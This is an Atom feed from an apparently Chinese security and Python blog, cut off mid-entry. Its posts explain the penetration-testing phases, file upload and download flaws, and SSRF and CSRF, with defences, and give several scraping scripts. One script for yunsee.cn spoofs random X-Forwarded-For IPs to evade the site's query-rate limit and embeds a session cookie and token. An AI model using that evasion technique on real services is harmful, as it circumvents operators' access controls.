<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-21T14:09:48.162Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>shiqian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试流程</title>
    <link href="http://yoursite.com/2018/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/08/21/渗透测试流程/</id>
    <published>2018-08-21T13:37:05.000Z</published>
    <updated>2018-08-21T14:09:48.162Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-105.png" alt="upload successful"></p><h1 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h1><p>通过实际的攻击进行安全测试与评估的方法</p><p>渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等</p><h1 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a>测试分类</h1><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h5><p>完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中的一些一直活的安全漏洞，并评估。黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。</p><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>费时费力 需要高技术  </p><h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>渗透测试者在拥有客户组织所有知识的情况下所进行的渗透测试</p><h5 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h5><p>可以了解到关于目标环境的所有内部与底层知识 因此最小代价发现和验证系统中最严重的安全漏洞。时间少代价低  </p><h5 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h5><p>最大的问题是无法有效的测试客户组织的应急响应程序 也无法判断出他们的安全防护计划对检测特定攻击的效率 </p><h4 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h4><p>黑白组合可以提供对目标系统更加深入和全面的安全审查</p><h1 id="渗透测试执行标准"><a href="#渗透测试执行标准" class="headerlink" title="渗透测试执行标准"></a>渗透测试执行标准</h1><p>安全测试方法学开源手册（osstmm） </p><p>网络安全测试指南（NIST SP 800-42） </p><p>OWASP十大Web应用安全威胁项目     </p><p>Web安全威胁分类标准（WASC-TC）  </p><p>完整方法论：PTES 渗透测试执行标准 (Penetration Testing Execution Standard)</p><h1 id="PTES渗透测试执行标准"><a href="#PTES渗透测试执行标准" class="headerlink" title="PTES渗透测试执行标准"></a>PTES渗透测试执行标准</h1><h4 id="1-前期交互阶段-Pre-Engagement-Interaction"><a href="#1-前期交互阶段-Pre-Engagement-Interaction" class="headerlink" title="1.前期交互阶段(Pre-Engagement Interaction)"></a>1.前期交互阶段(Pre-Engagement Interaction)</h4><p>渗透测试团队与客户组织进行交互讨论，最重要的是确定测试范围、目标、限制条件以及服务合同细节。该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><h4 id="2情报搜集阶段（Informatin-Gathering）"><a href="#2情报搜集阶段（Informatin-Gathering）" class="headerlink" title="2情报搜集阶段（Informatin Gathering）"></a>2情报搜集阶段（Informatin Gathering）</h4><p>在目标范围确定后，渗透测试团队可以利用各种信息来源与收集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。可以使用的情报搜集方法包括公开来源的信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务检查等，情报搜集是否充分在很大程度上决定了渗透测试的成败。</p><h4 id="3威胁建模阶段（Threat-Modeling）"><a href="#3威胁建模阶段（Threat-Modeling）" class="headerlink" title="3威胁建模阶段（Threat Modeling）"></a>3威胁建模阶段（Threat Modeling）</h4><p>在搜集到充分的情报信息之后，大家聚集到一起针对获取的信息进行威胁建模与攻击规划，通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道</p><h4 id="4-漏洞分析阶段（Vulnerablity-Analysis）"><a href="#4-漏洞分析阶段（Vulnerablity-Analysis）" class="headerlink" title="4.漏洞分析阶段（Vulnerablity Analysis）"></a>4.漏洞分析阶段（Vulnerablity Analysis）</h4><p>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，希望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h4 id="5-渗透攻击阶段（Exploitation）"><a href="#5-渗透攻击阶段（Exploitation）" class="headerlink" title="5.渗透攻击阶段（Exploitation）"></a>5.渗透攻击阶段（Exploitation）</h4><p>在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。<br>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸（清除痕迹），从而避免造成目标组织安全响应团队的警觉和发现。 </p><h4 id="6-后渗透测试阶段（Post-Exploitation）"><a href="#6-后渗透测试阶段（Post-Exploitation）" class="headerlink" title="6.后渗透测试阶段（Post Exploitation）"></a>6.后渗透测试阶段（Post Exploitation）</h4><p>在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>假设测试对象为一个软件开发企业，核心业务是定制开发软件，渗透测试者可能拿到web权限，能否修改下载链接中的程序源码植入后门呢，造成的是企业声誉的影响。</p><h4 id="7-报告阶段（Reporting）"><a href="#7-报告阶段（Reporting）" class="headerlink" title="7.报告阶段（Reporting）"></a>7.报告阶段（Reporting）</h4><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><p>比如，一个sql注入漏洞，一般报告中会写出，对所有用户输入进行检查过滤，使用参数化的sql查询语句，在一个受限的用户账户上运行sql语句，以及使用定制的出错消息。但从客户角度按此修补并不完全，根本原因很可能是采用了不安全的第三方应用或者由不可控第三方开发</p><h1 id="安全漏洞的生命周期"><a href="#安全漏洞的生命周期" class="headerlink" title="安全漏洞的生命周期"></a>安全漏洞的生命周期</h1><h4 id="一个典型的安全漏洞的生命周期分为七个部分："><a href="#一个典型的安全漏洞的生命周期分为七个部分：" class="headerlink" title="一个典型的安全漏洞的生命周期分为七个部分："></a>一个典型的安全漏洞的生命周期分为七个部分：</h4><p>1.安全漏洞的挖掘与研究</p><p>2.渗透代码的开发与测试</p><p>3.安全漏洞与渗透代码在封闭团队内流传，截止到这个阶段为oday</p><p>4.安全漏洞与渗透代码开始扩散</p><p>5.恶意程序出现开始传播，厂商发布补丁</p><p>6.渗透代码/恶意程序大规模传播并开始危害互联网，危害达到巅峰</p><p>7.渗透代码/恶意程序/攻击工具逐渐消亡</p><h4 id="安全漏洞生命周期示意图"><a href="#安全漏洞生命周期示意图" class="headerlink" title="安全漏洞生命周期示意图"></a>安全漏洞生命周期示意图</h4><p><img src="\images\pasted-103.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件处理漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/文件处理漏洞/</id>
    <published>2018-08-21T12:53:05.000Z</published>
    <updated>2018-08-21T13:31:18.199Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-102.png" alt="upload successful"></p><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><p>文件处理漏洞分为：任意文件上传漏洞和任意文件下载漏洞</p><h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>web应用程序在处理用户上传的文件时，解析了用户上传的恶意脚本文件，导致用户可以直接控制web服务器</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>文件上传时检查不严</p><p>文件上传后对文件名处理不当，允许用户修改文件名的后缀</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>对文件类型进行限制</p><p>对文件名后缀进行限制，采用白名单</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>文件上传目录设置为不可执行</p><p>判断文件的类型，采用白名单策略</p><p>采用随机数来存储文件名</p><p>单独设置文件服务器域名，这个服务器不能运行动态的网页</p><h1 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>网站对用户查看或下载的文件没有做限制，则恶意用户可以查看或下载任意敏感文件，下载系统的配置文件、源代码等，从而获得更多的漏洞</p><h3 id="可能存在的漏洞位置"><a href="#可能存在的漏洞位置" class="headerlink" title="可能存在的漏洞位置"></a>可能存在的漏洞位置</h3><p>导入文件时，直接输入文件名，则可能有注入点</p><p>代码中查看危险函数，如php中的readfile、fopen、file_get_contents</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>过滤.(点)，使用户不能在url中回溯上级目录</p><p>严格判断用户输入参数的格式</p><p>限制文件的访问范围，如php.ini中配置open_basedir</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>请求伪造漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/请求伪造漏洞/</id>
    <published>2018-08-21T11:56:05.000Z</published>
    <updated>2018-08-21T12:45:35.135Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-99.png" alt="upload successful"></p><p>请求伪造漏洞，分为服务端请求伪造漏洞（SSRF）和跨站请求伪造漏洞（CSRF）</p><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务端请求伪造漏洞是一种构造由服务端发起请求的一种安全漏洞，SSRF攻击的目标是从外网无法访问的内部系统，很多web应用都提供从其他服务器上获取数据的功能，使用用户指定的URL，web应用可以下载文件，读取文件内容，攻击者恶意利用存在缺陷的web应用作为代理来攻击远程和本地的服务器。</p><p>如果应用对用户的url和远程返回的信息没有进行验证和过滤，就可能存在这种服务端请求伪造攻击。</p><p>该攻击主要为绕过网络限制，攻击企业内网。</p><h3 id="攻击过程图"><a href="#攻击过程图" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-100.png" alt="upload successful"></p><h3 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h3><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><p>端口扫描，获取banner信息，对内网应用进行指纹识别，file协议读取本地文件</p><h5 id="执行指令："><a href="#执行指令：" class="headerlink" title="执行指令："></a>执行指令：</h5><p>利用get参数，攻击内外网应用程序</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>过滤返回的信息</p><p>统一错误信息</p><p>限制请求端口为http常用端口</p><p>采用黑名单禁止访问内网IP</p><p>禁用不必要的协议</p><h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者利用用户的身份发起了用户不知道的请求，比如发个信息，发个留言</p><p>包括但不限于：</p><p>以用户名义发邮件</p><p>发消息</p><p>盗账号</p><p>购买商品</p><p>虚拟货币转账</p><h3 id="攻击过程图-1"><a href="#攻击过程图-1" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-101.png" alt="upload successful"></p><p>所需的特定条件：</p><p>受害者必须登录过正常的网站</p><p>受害者必须打开黑客提供的恶意链接</p><p>网站没有如验证码之类的特殊验证方法</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>最简洁有效的防御方法，CSRF的攻击过程，往往是在用户不知情的情况下构造网络请求，验证码则要求用户必须与应用进行交互。出于用户体验考虑，验证码只能作为一种辅助手段</p><h5 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer  Check"></a>Referer  Check</h5><p>Referer  Check最常见的应用是图片盗链，同样可以用来检查请求是否来自合法的源，Referer  Check的缺陷在于并非什么时候都能取到referer，用户有时出于隐私保护考虑，会禁止referer的发送</p><h5 id="Anti-CSRF-token"><a href="#Anti-CSRF-token" class="headerlink" title="Anti  CSRF  token"></a>Anti  CSRF  token</h5><p>CSRF的本质：其本质原因是：重要操作的所有参数都是可以被攻击者猜测到的</p><p>于是可以通过把参数加密或者使用一些随机数，从而让攻击则无法猜测到参数值</p><p>新增一个参数token，token的值是随机的，只被用户和服务器所共有，不被第三者知晓</p><p>将token同时放在表单和session中，若不一致，则可能为CSRF攻击</p><p>使用token时的原则：</p><p>足够的随机性，使用安全的随机数生成器生成token</p><p>保密性，token尽量放在表单中，把敏感操作由get改为post，由表单提交</p><p>###</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>云悉-爬取域名信息</title>
    <link href="http://yoursite.com/2018/08/18/%E4%BA%91%E6%82%89-%E7%88%AC%E5%8F%96%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
    <id>http://yoursite.com/2018/08/18/云悉-爬取域名信息/</id>
    <published>2018-08-18T13:21:45.000Z</published>
    <updated>2018-08-18T14:08:13.864Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="要达成的目的"><a href="#要达成的目的" class="headerlink" title="要达成的目的"></a>要达成的目的</h1><p>从云悉网在极短时间内多次获取要查询的域名信息，以在渗透测试前期对目标进行快速的信息收集</p><h1 id="目标网址"><a href="#目标网址" class="headerlink" title="目标网址"></a>目标网址</h1><p><a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></p><p>云悉：WEB资产梳理、在线CMS指纹识别平台</p><h1 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h1><p>经过两次查询发现，云悉存在查询的时间间隔限制，大概在1分钟左右，通过F12，在网络一栏，一个个找请求成功的包，看post的200的请求，在响应里，找到我们想要的，类似于</p><p>whois_isp    Alibaba Cloud Computing (Beijing) Co., Ltd.<br>whois_mail    <a href="mailto:DomainAbuse@service.aliyun.com" target="_blank" rel="noopener">DomainAbuse@service.aliyun.com</a><br>whois_date    2019-01-23 06:48:26<br>ip    223.7.8.143<br>icp_id    京ICP备13013886号<br>cdn<br>os    Windows<br>server    Microsoft-IIS/7.5<br>whois_dns    dns13.hichina.com,dns14.hichina.com<br>whois_name    null<br>icp_name    北京谷安天下科技有限公司<br>create    2018-08-18 21:43:54</p><p>然后在消息头里编辑和重发</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>云悉不允许频繁查询，所以我们想到了代理池，然而代理池多数要花钱，所以最后用随机ip数的方法解决</p><h4 id="第一种随机ip方法"><a href="#第一种随机ip方法" class="headerlink" title="第一种随机ip方法"></a>第一种随机ip方法</h4><p>import random</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>for i in range(0, 500):<br>    choice = (<br>        random.randint(1, 2),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>    )</p><p>headers[“X-Forwarded-For”] = (str(random.randint(1, 255)) + “.”) + (str(random.randint(1, 255)) + “.”) + (<br>        str(random.randint(1, 255)) + “.”) + str(random.randint(1, 255))</p><h4 id="第二种随机ip方法"><a href="#第二种随机ip方法" class="headerlink" title="第二种随机ip方法"></a>第二种随机ip方法</h4><p>import random<br>import socket<br>import struct</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>random_ip =socket.inet_ntoa(struct.pack(‘&gt;I’, random.randint(1, 0xffffffff)))</p><p>headers[“X-Forwarded-For”] = random_ip</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 -"></a>-<em>- coding: utf-8 -</em></h1><p>import requests<br>import random<br>import json<br>import random<br>import socket<br>import struct</p><p>def post(domain):<br>        ‘’’<br>        Auther: 史前、祝融<br>        post函数用于向云悉请求要查询的域名信息，包括备案单位、邮箱、域名所有者、备案号、DNS、域名注册商<br>        :param domain: 用于传递要查询的域名<br>        :return: 正常查询：返回的是以Json格式呈现的域名信息<br>                 异常查询：返回的是异常的原因<br>        ‘’’</p><pre><code>#设置随机IP，以避过单个ip查询频繁限制random_ip = socket.inet_ntoa(struct.pack(&apos;&gt;I&apos;, random.randint(1, 0xffffffff)))headers ={&apos;Host&apos;: &apos;www.yunsee.cn&apos;,&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,&apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,&apos;Referer&apos;: &apos;http://www.yunsee.cn/&apos;,&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,&apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,&apos;Content-Length&apos;: &apos;97&apos;,&apos;Cookie&apos;: &apos;__cfduid=d615e3e4064581ccc283392de521cc58b1534506150; yjs_id=54ba88144fa537011258f5befd166064; ctrl_time=1; Hm_lvt_020d18ec72d744884bf6b81cc118775b=1534507185,1534586778,1534587126,1534587154; laravel_session=eyJpdiI6IlNlbHg0WlBaYmVqWGd1ckdkZlFqT0E9PSIsInZhbHVlIjoiU1dDOWZtdGJkZVBIMHY3ckwyTFMyR21YYVFUTVFmSlBDSzVnTnE0Q0hBYnFIVXVjWkQ5dWkxQWdwVmNvTTdYdkFWMmVyeTNHRGJnXC9NYXRJRUt0d3RRPT0iLCJtYWMiOiJjOTg1MjlmNjlmM2MzZTg4MDYyOTU2OWM3MjA5NzNiZWU4YTdkN2Y1MTg4MjljNDlhMDMzYmQ3NzIyN2Y4MWRkIn0%3D; Hm_lpvt_020d18ec72d744884bf6b81cc118775b=1534587154&apos;,&apos;Connection&apos;: &apos;keep-alive&apos;,&apos;X-Forwarded-For&apos;: &apos;%s&apos;}#向headers中的X-Forwarded-For参数传递随机IPheaders[&quot;X-Forwarded-For&quot;] = random_ip#yunsee查询页面的urlurl = &apos;http://www.yunsee.cn/home/getInfo&apos;#异常捕获try:    data = {&apos;type&apos;:&apos;webinfo&apos;, &apos;string&apos;:&apos;d879af297g54df45&apos;, &apos;url&apos;:domain, &apos;_token&apos;:&apos;wv8Y74w1owhw0glf9gPvyIlfFrSaIvzIz9g8dU6i&apos;}    #设置post的数据，以及超时时间    r = requests.post(url,headers=headers,data=data,timeout=15)    #捕获连接异常    rcontent = r.content.decode()    # 对要查询的域名是否在白名单进行判断    if &quot;禁止&quot; in json.loads(rcontent)[&apos;mess&apos;]:        return &quot;不允许查询&quot;    # 以Json格式返回数据    return json.loads(rcontent)[&apos;res&apos;]except requests.ConnectionError as e:        return &quot;网络问题&quot;</code></pre><p>if <strong>name</strong>==’<strong>main</strong>‘:<br>    post(“aliyun.com”)</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>x-path爬取CNNIC</title>
    <link href="http://yoursite.com/2018/08/18/X-path%E7%88%AC%E5%8F%96CNNIC/"/>
    <id>http://yoursite.com/2018/08/18/X-path爬取CNNIC/</id>
    <published>2018-08-18T09:05:45.000Z</published>
    <updated>2018-08-18T13:51:04.996Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="XPath介绍"><a href="#XPath介绍" class="headerlink" title="XPath介绍"></a><strong>XPath介绍</strong></h1><p>XPath在python的爬虫学习中，起着举足轻重的地位，对比正则表达式 re两者可以完成同样的工作，实现的功能也差不多，但XPath明显比re具有优势，在网页分析上使re退居二线 。全称为<strong>XML Path Language</strong> 一种小型的<strong>查询语言</strong> 。</p><h1 id="它所具备的优点："><a href="#它所具备的优点：" class="headerlink" title="它所具备的优点："></a>它所具备的优点：</h1><p>1） 可在XML中查找信息   </p><p>2） 支持HTML的查找   </p><p>3） 通过元素和属性进行导航  </p><h1 id="python使用XPath"><a href="#python使用XPath" class="headerlink" title="python使用XPath"></a>python使用XPath</h1><p>由于XPath属于lxml库模块，所以首先要安装库lxml，可用<code>pip install  lxml</code>  安装，pip库的安装自行百度</p><h1 id="x-path简单调用方法"><a href="#x-path简单调用方法" class="headerlink" title="x-path简单调用方法"></a>x-path简单调用方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from lxml import  etree  </span><br><span class="line"></span><br><span class="line">selector=etree.HTML(源码)  #将源码转化为能被XPath匹配的格式selector.xpath(表达式) </span><br><span class="line"></span><br><span class="line">bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import lxml</span><br><span class="line">from lxml import etree</span><br><span class="line">def get():</span><br><span class="line">   headers = &#123;</span><br><span class="line">   &apos;user-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;,</span><br><span class="line">   &#125;</span><br><span class="line">   url = &apos;http://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?txtquery=8.8.8.8&amp;queryOption=ipv4&apos;</span><br><span class="line">   req = requests.get(url,headers=headers)</span><br><span class="line">   #etree提供了更快速方便解析提取html页面数据的方式</span><br><span class="line">   shuju = etree.HTML(req.text)</span><br><span class="line">   bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br><span class="line">   #将两个列表组成字典</span><br><span class="line">   res = dict(zip([x.text for x in bg[::2]],[x.text for x in bg[1::2]]))</span><br><span class="line">   for k,v in res.items():</span><br><span class="line">      print(k,v)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">   get()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-4</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-4/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-4/</id>
    <published>2018-08-15T14:46:29.000Z</published>
    <updated>2018-08-15T16:20:08.938Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>爬虫，用Python写的很多的，re模块，BeautifulSoup模块，pyspider模块，pyquery等等</p><p>还要用到requests模块，urllib模块，urllib2模块，还有一个四叶草公司开发的hackhttp等等</p><p>BeautifulSoup模块和requests模块，Pyspider都要安装，因为是第三方库</p><p>目标网站：<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html</a></p><p>要实现的目标是爬取学校的名字，并按省份分类放置</p><p>代码如下：</p><p>#encoding=utf-8</p><p>import  requests<br>import lxml<br>import json<br>import logging   #解决ssl错误的<br>import sys<br>from bs4 import BeautifulSoup as bs<br>logging.captureWarnings(True)<br>reload(sys)     #解决编码问题的<br>sys.setdefaultencoding(‘utf-8’)<br>def school():<br>    for i in range(2, 34, 1):<br>        try:<br>           url = ‘<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)</a>)<br>           headers = {<br>               ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0’}<br>           r = requests.get(url=url,headers=headers,verify=False)<br>           soup = bs(r.content,’lxml’)<br>           content2 = soup.find_all(name=”td”, attrs={“colspan”: “7”})[0].string<br>           f1 = open(“D:/%s.txt” % (content2), “wb”)<br>           content = soup.find_all(name=’tr’,attrs={“height”:”29”})<br>           for content1 in content:<br>             try:<br>               soup_content = bs(str(content1), “lxml”)<br>               soup_content1 = soup_content.find_all(name=”td”)<br>               f1.write(soup_content1[1].string +’\n’)<br>               print(soup_content1[1].string)<br>             except IndexError:<br>                 pass<br>        except IndexError:<br>            pass</p><p>if <strong>name</strong>==’<strong>main</strong>‘:<br>    school()</p><p>爬虫遇到的问题：</p><p><code>requests.exceptions.SSLError: HTTPSConnectionPool(host=&#39;gaokao.chsi.com.cn&#39;, port=443): Max retries</code> </p><p>解决方法：</p><p>import logging</p><p>logging.captureWarnings(True)</p><p>r = requests.get(url=url,verify=False)</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-3</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8Cpython%E5%BD%93%E6%AD%8C-3/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，python当歌-3/</id>
